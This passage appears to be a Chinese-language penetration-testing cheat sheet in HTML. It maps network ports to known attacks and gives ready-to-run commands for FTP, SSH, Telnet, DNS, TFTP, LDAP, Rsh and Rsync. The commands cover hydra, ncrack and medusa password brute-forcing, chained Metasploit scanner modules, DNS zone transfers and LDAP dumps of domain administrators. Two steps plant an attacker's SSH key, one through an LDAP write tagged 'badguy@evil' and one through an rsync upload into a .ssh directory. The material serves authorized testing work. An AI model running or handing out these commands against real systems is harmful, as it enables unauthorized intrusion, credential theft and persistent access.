<td>爆破&#x2F;注入&#x2F;缓冲区溢出</td>
</tr>
<tr>
<td>5306</td>
<td>Kibana</td>
<td>未授权访问</td>
</tr>
<tr>
<td>5900,5901,5902</td>
<td>vnc</td>
<td>弱口令爆破</td>
</tr>
<tr>
<td>5984</td>
<td>CouchDB</td>
<td>未授权访问导致任意指令执行</td>
</tr>
<tr>
<td>6379</td>
<td>Redis数据库</td>
<td>未授权访问&#x2F;远程命令执行</td>
</tr>
<tr>
<td>6443</td>
<td>Kubernetes API Server</td>
<td>未授权访问</td>
</tr>
<tr>
<td>7001&#x2F;7002</td>
<td>WebLogic</td>
<td>java反序列化&#x2F;控制台弱口令&#x2F;控制台上传webshell&#x2F;SSRF</td>
</tr>
<tr>
<td>80-89,443</td>
<td>http&#x2F;https</td>
<td>web应用漏洞&#x2F;OpenSSL心脏滴血</td>
</tr>
<tr>
<td>8000</td>
<td>JDWP</td>
<td>远程命令执行漏洞</td>
</tr>
<tr>
<td>8009</td>
<td>AJP</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>8069</td>
<td>Zabbix服务</td>
<td>远程命令执行&#x2F;注入</td>
</tr>
<tr>
<td>8080-8089</td>
<td>Jboss&#x2F;Tomcat&#x2F;Jenkins&#x2F;Resin&#x2F;Jetty</td>
<td>控制台弱口令&#x2F;反序列化&#x2F;RCE</td>
</tr>
<tr>
<td>8083&#x2F;8086</td>
<td>InfluxDB</td>
<td>未授权访问</td>
</tr>
<tr>
<td>8161</td>
<td>ActiveMQ</td>
<td>弱口令&#x2F;任意文件写入&#x2F;反序列化</td>
</tr>
<tr>
<td>9000</td>
<td>FastCGI</td>
<td>远程命令执行</td>
</tr>
<tr>
<td>9080-9081,9090</td>
<td>Websphere控制台</td>
<td>java反序列化&#x2F;弱口令</td>
</tr>
<tr>
<td>9200&#x2F;9300</td>
<td>ElasticSearch</td>
<td>未授权访问&#x2F;远程代码执行</td>
</tr>
<tr>
<td>11211</td>
<td>Memcached</td>
<td>未授权访问</td>
</tr>
<tr>
<td>15672</td>
<td>RabbitMQ</td>
<td>弱口令</td>
</tr>
<tr>
<td>27017&#x2F;27018</td>
<td>MongoDB</td>
<td>未授权访问&#x2F;爆破</td>
</tr>
<tr>
<td>50000</td>
<td>SAP</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>50030,50060,50070,50075,50090</td>
<td>Hadoop</td>
<td>默认端口未授权访问</td>
</tr>
</tbody></table>
<hr>
<h3 id="21-FTP"><a href="#21-FTP" class="headerlink" title="21-FTP"></a>21-FTP</h3><h4 id="Banner-抓取"><a href="#Banner-抓取" class="headerlink" title="Banner 抓取"></a>Banner 抓取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -vn &lt;IP&gt; 21</span><br><span class="line"></span><br><span class="line">telnet -n &#123;IP&#125; 21</span><br></pre></td></tr></table></figure>
<h4 id="匿名登录"><a href="#匿名登录" class="headerlink" title="匿名登录"></a>匿名登录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp &lt;IP&gt;</span><br><span class="line">&gt;anonymous</span><br><span class="line">&gt;anonymous</span><br><span class="line">&gt;ls -a  # List all files (even hidden) (yes, they could be hidden)</span><br><span class="line">&gt;binary #Set transmission to binary instead of ascii</span><br><span class="line">&gt;ascii  #Set transmission to ascii instead of binary</span><br><span class="line">&gt;bye    #exit</span><br></pre></td></tr></table></figure>
<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -m ftp://anonymous:anonymous@10.10.10.1     #Donwload all</span><br><span class="line">wget -m --no-passive ftp://anonymous:anonymous@10.10.10.1 #Download all</span><br></pre></td></tr></table></figure>
<h4 id="浏览器连接"><a href="#浏览器连接" class="headerlink" title="浏览器连接"></a>浏览器连接</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://anonymous:anonymous@10.10.10.1</span><br></pre></td></tr></table></figure>
<h4 id="渗透方式"><a href="#渗透方式" class="headerlink" title="渗透方式"></a>渗透方式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) nmap ftp</span><br><span class="line">nmap --script ftp-* -p 21 &#123;IP&#125;</span><br><span class="line"></span><br><span class="line">2) Hydra Brute Force</span><br><span class="line">hydra -t 1 -l &#123;Username&#125; -P &#123;Big_Passwordlist&#125; -vV &#123;IP&#125; ftp</span><br><span class="line"></span><br><span class="line">3) consolesless mfs enumeration ftp</span><br><span class="line">msfconsole -q -x &#x27;use auxiliary/scanner/ftp/anonymous; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/scanner/ftp/ftp_version; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/scanner/ftp/bison_ftp_traversal; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/scanner/ftp/colorado_ftp_traversal; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#x27; &amp;&amp;  msfconsole -q -x &#x27;use auxiliary/scanner/ftp/titanftp_xcrc_traversal; set RHOSTS &#123;IP&#125;; set RPORT 21; run; exit&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ftp</span><br><span class="line">ncrack -p 21 --user root -P passwords.txt &lt;IP&gt; [-T 5]</span><br><span class="line">medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-ftp">https://book.hacktricks.xyz/pentesting/pentesting-ftp</a></li>
<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</a></li>
</ul>
<h3 id="22-SSH-x2F-SFTP"><a href="#22-SSH-x2F-SFTP" class="headerlink" title="22-SSH&#x2F;SFTP"></a>22-SSH&#x2F;SFTP</h3><h4 id="Banner抓取"><a href="#Banner抓取" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -vn &lt;IP&gt; 22</span><br></pre></td></tr></table></figure>
<h4 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -v ip -p port</span><br></pre></td></tr></table></figure>
<h4 id="公钥收集"><a href="#公钥收集" class="headerlink" title="公钥收集"></a>公钥收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keyscan -t rsa &lt;IP&gt; -p &lt;PORT&gt;</span><br></pre></td></tr></table></figure>
<h4 id="Nmap-渗透"><a href="#Nmap-渗透" class="headerlink" title="Nmap 渗透"></a>Nmap 渗透</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p22 &lt;ip&gt; -sC   # 使用默认脚本</span><br><span class="line">nmap -p22 &lt;ip&gt; -sV   # 检索版本</span><br><span class="line">nmap -p22 &lt;ip&gt; --script ssh2-enum-algos   # 检索支持的算法</span><br><span class="line">nmap -p22 &lt;ip&gt; --script ssh-hostkey --script-args ssh_hostkey=full     # 检索弱密钥</span><br><span class="line">nmap -p22 &lt;ip&gt; --script ssh-auth-methods --script-args=&quot;ssh.user=root&quot; # 检查认证方式</span><br></pre></td></tr></table></figure>
<h4 id="Msf-渗透"><a href="#Msf-渗透" class="headerlink" title="Msf 渗透"></a>Msf 渗透</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole -q -x &#x27;use auxiliary/scanner/ssh/ssh_version; set RHOSTS &#123;IP&#125;; set RPORT 22; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use scanner/ssh/ssh_enumusers; set RHOSTS &#123;IP&#125;; set RPORT 22; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS &#123;IP&#125;; set RPORT 22; run; exit&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf&gt; use scanner/ssh/ssh_enumusers</span><br><span class="line">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ssh</span><br><span class="line">ncrack -p 22 --user root -P passwords.txt &lt;IP&gt; [-T 5]</span><br><span class="line">medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ssh</span><br><span class="line">patator ssh_login host=&lt;ip&gt; port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg=&#x27;Authentication failed&#x27;</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://community.turgensec.com/ssh-hacking-guide/">https://community.turgensec.com/ssh-hacking-guide/</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-ssh">https://book.hacktricks.xyz/pentesting/pentesting-ssh</a></li>
<li><a href="https://github.com/arthepsy/ssh-audit">https://github.com/arthepsy/ssh-audit</a></li>
</ul>
<h3 id="23-Telnet"><a href="#23-Telnet" class="headerlink" title="23-Telnet"></a>23-Telnet</h3><h4 id="Banner抓取-1"><a href="#Banner抓取-1" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -vn &lt;IP&gt; 23</span><br><span class="line"></span><br><span class="line">nmap -n -sV -Pn --script &quot;*telnet* and safe&quot; -p 23 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h4 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -sV -Pn --script &quot;*telnet*&quot; -p 23 &#123;IP&#125;</span><br><span class="line"></span><br><span class="line">msfconsole -q -x &#x27;use auxiliary/scanner/telnet/telnet_version; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS &#123;IP&#125;; set RPORT 23; run; exit&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-2"><a href="#暴力破解-2" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet</span><br><span class="line">ncrack -p 23 --user root -P passwords.txt &lt;IP&gt; [-T 5]</span><br><span class="line">medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-telnet">https://book.hacktricks.xyz/pentesting/pentesting-telnet</a></li>
</ul>
<h3 id="53-DNS"><a href="#53-DNS" class="headerlink" title="53-DNS"></a>53-DNS</h3><h4 id="Banner抓取-2"><a href="#Banner抓取-2" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig version.bind CHAOS TXT @DNS</span><br><span class="line"></span><br><span class="line">nmap -n -sV -Pn --script dns-nsid -p 53 &#123;IP&#125;</span><br></pre></td></tr></table></figure>
<h4 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig axfr @&lt;DNS_IP&gt;           # 尝试无域名的域传送</span><br><span class="line">dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;  # 域传送猜解域名</span><br><span class="line">fierce --domain &lt;DOMAIN&gt; --dns-servers &lt;DNS_IP&gt;  # 尝试对每个权威服务器执行域传输，如不行则发起字典攻击</span><br></pre></td></tr></table></figure>
<h4 id="Dig-利用"><a href="#Dig-利用" class="headerlink" title="Dig 利用"></a>Dig 利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig ANY @&lt;DNS_IP&gt; &lt;DOMAIN&gt;     #Any information</span><br><span class="line">dig A @&lt;DNS_IP&gt; &lt;DOMAIN&gt;       #Regular DNS request</span><br><span class="line">dig AAAA @&lt;DNS_IP&gt; &lt;DOMAIN&gt;    #IPv6 DNS request</span><br><span class="line">dig TXT @&lt;DNS_IP&gt; &lt;DOMAIN&gt;     #Information</span><br><span class="line">dig MX @&lt;DNS_IP&gt; &lt;DOMAIN&gt;      #Emails related</span><br><span class="line">dig NS @&lt;DNS_IP&gt; &lt;DOMAIN&gt;      #DNS that resolves that name</span><br><span class="line">dig -x 192.168.0.2 @&lt;DNS_IP&gt;   #Reverse lookup</span><br><span class="line">dig -x 2a00:1450:400c:c06::93 @&lt;DNS_IP&gt; #reverse IPv6 lookup</span><br><span class="line"></span><br><span class="line">#Use [-p PORT]  or  -6 (to use ivp6 address of dns)</span><br></pre></td></tr></table></figure>
<h4 id="DNS反向爆破"><a href="#DNS反向爆破" class="headerlink" title="DNS反向爆破"></a>DNS反向爆破</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnsrecon -r 127.0.0.0/24 -n &lt;IP_DNS&gt;  #DNS reverse of all of the addresses</span><br><span class="line">dnsrecon -r 127.0.1.0/24 -n &lt;IP_DNS&gt;  #DNS reverse of all of the addresses</span><br><span class="line">dnsrecon -r &lt;IP_DNS&gt;/24 -n &lt;IP_DNS&gt;   #DNS reverse of all of the addresses</span><br><span class="line">dnsrecon -d active.htb -a -n &lt;IP_DNS&gt; #Zone transfer</span><br></pre></td></tr></table></figure>
<h4 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnsrecon -D subdomains-1000.txt -d &lt;DOMAIN&gt; -n &lt;IP_DNS&gt;</span><br><span class="line">dnscan -d &lt;domain&gt; -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan</span><br></pre></td></tr></table></figure>
<h4 id="渗透攻击-1"><a href="#渗透攻击-1" class="headerlink" title="渗透攻击"></a>渗透攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n --script &quot;(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport&quot; &#123;IP&#125;</span><br><span class="line"></span><br><span class="line">msfconsole -q -x &#x27;use auxiliary/scanner/dns/dns_amp; set RHOSTS &#123;IP&#125;; set RPORT 53; run; exit&#x27; &amp;&amp; msfconsole -q -x &#x27;use auxiliary/gather/enum_dns; set RHOSTS &#123;IP&#125;; set RPORT 53; run; exit&#x27;</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-dns">https://book.hacktricks.xyz/pentesting/pentesting-dns</a></li>
</ul>
<h3 id="69-TFTP"><a href="#69-TFTP" class="headerlink" title="69-TFTP"></a>69-TFTP</h3><h4 id="服务枚举"><a href="#服务枚举" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -Pn -sU -p69 -sV --script tftp-enum &lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h4 id="下载上传"><a href="#下载上传" class="headerlink" title="下载上传"></a>下载上传</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5&gt; auxiliary/admin/tftp/tftp_transfer_util</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">import tftpy</span><br><span class="line">client = tftpy.TftpClient(&lt;ip&gt;, &lt;port&gt;)</span><br><span class="line">client.download(&quot;filename in server&quot;, &quot;/tmp/filename&quot;, timeout=5)</span><br><span class="line">client.upload(&quot;filename to upload&quot;, &quot;/local/path/file&quot;, timeout=5)</span><br></pre></td></tr></table></figure>

<h3 id="389-x2F-636-LDAP"><a href="#389-x2F-636-LDAP" class="headerlink" title="389&#x2F;636-LDAP"></a>389&#x2F;636-LDAP</h3><h4 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">389（ldap） and 636（ldaps）</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE REASON</span><br><span class="line">389/tcp open  ldap    syn-ack</span><br><span class="line">636/tcp open  tcpwrapped</span><br></pre></td></tr></table></figure>
<h4 id="服务枚举-1"><a href="#服务枚举-1" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -sV --script &quot;ldap* and not brute&quot; &lt;IP&gt;   #Using anonymous credentials</span><br><span class="line"></span><br><span class="line">nmap -p 389 --script ldap-search -Pn &#123;IP&#125;</span><br></pre></td></tr></table></figure>
<h4 id="数据写入"><a href="#数据写入" class="headerlink" title="数据写入"></a>数据写入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import ldap3</span><br><span class="line">&gt;&gt;&gt; server = ldap3.Server(&#x27;x.x.x.x&#x27;, port =636, use_ssl = True)</span><br><span class="line">&gt;&gt;&gt; connection = ldap3.Connection(server, &#x27;uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN&#x27;, &#x27;PASSWORD&#x27;, auto_bind=True)</span><br><span class="line">&gt;&gt;&gt; connection.bind()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; connection.extend.standard.who_am_i()</span><br><span class="line">u&#x27;dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN&#x27;</span><br><span class="line">&gt;&gt;&gt; connection.modify(&#x27;uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN&#x27;,&#123;&#x27;sshPublicKey&#x27;: [(ldap3.MODIFY_REPLACE, [&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil&#x27;])]&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="信息转储"><a href="#信息转储" class="headerlink" title="信息转储"></a>信息转储</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install ldapdomaindump </span><br><span class="line">ldapdomaindump &lt;IP&gt; [-r &lt;IP&gt;] -u &#x27;&lt;domain&gt;\&lt;username&gt;&#x27; -p &#x27;&lt;password&gt;&#x27; [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-3"><a href="#暴力破解-3" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script ldap-brute -p 389 &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">hydra -l &#123;Username&#125; -P &#123;Big_Passwordlist&#125; &#123;IP&#125; ldap2 -V -f</span><br></pre></td></tr></table></figure>
<h4 id="凭证攫取"><a href="#凭证攫取" class="headerlink" title="凭证攫取"></a>凭证攫取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）检查空凭证或凭证是否有效</span><br><span class="line"></span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br><span class="line"></span><br><span class="line">2）信息提取</span><br><span class="line"></span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br><span class="line">-x Simple Authentication</span><br><span class="line">-h LDAP Server</span><br><span class="line">-D My User</span><br><span class="line">-w My password</span><br><span class="line">-b Base site, all data from here will be given</span><br><span class="line"></span><br><span class="line">提取用户</span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br><span class="line">#Example: ldapsearch -x -h &lt;IP&gt; -D &#x27;MYDOM\john&#x27; -w &#x27;johnpassw&#x27; -b &quot;CN=Users,DC=mydom,DC=local&quot;</span><br><span class="line"></span><br><span class="line">提取计算机</span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;CN=Computers,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br><span class="line"></span><br><span class="line">提取my info</span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;CN=&lt;MY NAME&gt;,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br><span class="line"></span><br><span class="line">提取域管理员</span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;CN=Domain Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br><span class="line"></span><br><span class="line">提取域用户</span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;CN=Domain Users,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br><span class="line"></span><br><span class="line">提取企业管理员</span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;CN=Enterprise Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br><span class="line"></span><br><span class="line">提取管理员</span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;CN=Administrators,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br><span class="line"></span><br><span class="line">提取远程桌面组</span><br><span class="line">ldapsearch -x -h &lt;IP&gt; -D &#x27;&lt;DOMAIN&gt;\&lt;username&gt;&#x27; -w &#x27;&lt;password&gt;&#x27; -b &quot;CN=Remote Desktop Users,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span><br></pre></td></tr></table></figure>
<p>refer:</p>
<ul>
<li><a href="https://github.com/BeyondTrust/pbis-open/">https://github.com/BeyondTrust/pbis-open/</a></li>
<li><a href="https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/">https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-ldap">https://book.hacktricks.xyz/pentesting/pentesting-ldap</a></li>
</ul>
<h3 id="512-514-Rexec-x2F-Rlogin-x2F-Rsh"><a href="#512-514-Rexec-x2F-Rlogin-x2F-Rsh" class="headerlink" title="512-514: Rexec&#x2F;Rlogin&#x2F;Rsh"></a>512-514: Rexec&#x2F;Rlogin&#x2F;Rsh</h3><h4 id="指纹特征"><a href="#指纹特征" class="headerlink" title="指纹特征"></a>指纹特征</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) Rexec: 允许在主机内执行命令</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">512/tcp open  exec</span><br><span class="line"></span><br><span class="line">2) Rlogin/Rsh: 旧版远程登录</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">513/tcp open  login</span><br></pre></td></tr></table></figure>
<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rlogin &lt;IP&gt; -l &lt;username&gt;</span><br><span class="line"></span><br><span class="line">rsh &lt;IP&gt; &lt;Command&gt;</span><br><span class="line">rsh &lt;IP&gt; -l domain\user &lt;Command&gt;</span><br><span class="line">rsh domain/user@&lt;IP&gt; &lt;Command&gt;</span><br><span class="line">rsh domain\\user@&lt;IP&gt; &lt;Command&gt;</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-4"><a href="#暴力破解-4" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec://&lt;Victim-IP&gt; -v -V</span><br><span class="line"></span><br><span class="line">hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin://&lt;Victim-IP&gt; -v -V</span><br><span class="line"></span><br><span class="line">hydra -L &lt;Username_list&gt; rsh://&lt;Victim_IP&gt; -v -V</span><br></pre></td></tr></table></figure>
<h3 id="873-Rsync"><a href="#873-Rsync" class="headerlink" title="873-Rsync"></a>873-Rsync</h3><h4 id="Banner抓取-3"><a href="#Banner抓取-3" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -vn &lt;IP&gt; 873</span><br></pre></td></tr></table></figure>
<h4 id="服务枚举-2"><a href="#服务枚举-2" class="headerlink" title="服务枚举"></a>服务枚举</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV --script &quot;rsync-list-modules&quot; -p &lt;PORT&gt; &lt;IP&gt;</span><br><span class="line">msf&gt; use auxiliary/scanner/rsync/modules_list</span><br></pre></td></tr></table></figure>
<h4 id="暴力破解-5"><a href="#暴力破解-5" class="headerlink" title="暴力破解"></a>暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）列举分享模块</span><br><span class="line"></span><br><span class="line">rsync -av --list-only rsync://192.168.0.123/shared_name</span><br><span class="line"></span><br><span class="line">2）下载文件</span><br><span class="line"></span><br><span class="line">rsync -av --list-only rsync://username@192.168.0.123/shared_name</span><br><span class="line">rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared</span><br><span class="line"></span><br><span class="line">3）上传文件</span><br><span class="line"></span><br><span class="line">rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh</span><br><span class="line"></span><br><span class="line">4）寻找配置文件</span><br><span class="line"></span><br><span class="line">find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)</span><br></pre></td></tr></table></figure>
<h3 id="1080-Socks"><a href="#1080-Socks" class="headerlink" title="1080-Socks"></a>1080-Socks</h3><h4 id="认证检查"><a href="#认证检查" class="headerlink" title="认证检查"></a>认证检查</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 1080 &lt;ip&gt; --script socks-auth-info</span><br></pre></td></tr></table></figure>
